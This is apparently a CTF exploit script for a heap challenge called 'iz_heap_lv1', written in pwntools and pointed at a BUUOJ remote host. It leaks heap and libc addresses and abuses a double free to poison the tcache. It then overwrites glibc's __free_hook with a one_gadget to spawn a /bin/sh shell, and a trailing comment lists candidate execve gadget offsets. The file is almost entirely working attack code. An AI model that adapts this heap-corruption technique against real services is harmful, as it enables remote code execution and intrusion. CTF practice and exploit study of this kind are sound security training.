#!/usr/bin/python3

from pwn import *

exe = ELF("iz_heap_lv1_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""


                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("node4.buuoj.cn", 27807)
else:
    p = process(exe.path)

GDB()
sa(b"name: ", b"\0")


def add(size, data):
    sla(b"Choice: ", str(1).encode())
    sla(b"size: ", str(size).encode())
    sla(b"data: ", data)


def edit(idx, size, data):
    sla(b"Choice: ", str(2).encode())
    sla(b"index: ", str(idx).encode())
    sla(b"size: ", str(size).encode())
    sla(b"data: ", str(data).encode())


def free(idx):
    sla(b"Choice: ", str(3).encode())
    sla(b"index: ", str(idx).encode())


def show(option, addr):
    sla(b"Choice: ", str(4).encode())
    sla(b"(Y/N)", option)
    if option != "N":
        sa(b"name: ", addr)


for i in range(0, 21):
    add(0x80, b"a")
show("N", b"0")
p.recvuntil(b"Name: ")
heap = u64(p.recvline(keepends=False).ljust(8, b"\0")) >> 12 << 12
info("Heap: " + hex(heap))
for i in range(0, 18):
    free(i)
show("Y", p64(heap + 0xA40))
free(18)
free(19)
free(20)
for i in range(0, 7):
    add(0x68, b"a")

add(0x68, p64(heap + 0x250))
add(0x68, b"a")
add(0x68, b"a")
add(0x68, p64(0) + p64(0x541))
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
free(6)

free(0)
free(1)
free(2)
add(0, b"")
add(0, b"")
add(0, b"")
free(0)
free(1)
free(2)
add(0x50, p64(0) + p64(0x21) + p64(0x602040))
free(5)
free(0)
add(0x50, p64(0) + p64(0x21) + p64(0x602040))
add(0, b"")
add(0, b"")
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
add(0x68, b"a")
add(0, b"")

show("N", b"0")
p.recvuntil(b"Name: ")
libc.address = u64(p.recvline(keepends=False).ljust(8, b"\0")) - 0x3EC680
info("Libc base: " + hex(libc.address))

free(0)
free(1)
for i in range(5, 9):
        free(i)
for i in range(11, 17):
        free(i)
show("Y", p64(heap + 0xd50))
free(20)

for i in range(0, 7):
    add(0x68, b"a")
add(0x68, p64(libc.sym.__free_hook))
add(0x68, b"a")
add(0x68, b"a")
add(0x68, p64(libc.address + 0x4f322))

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''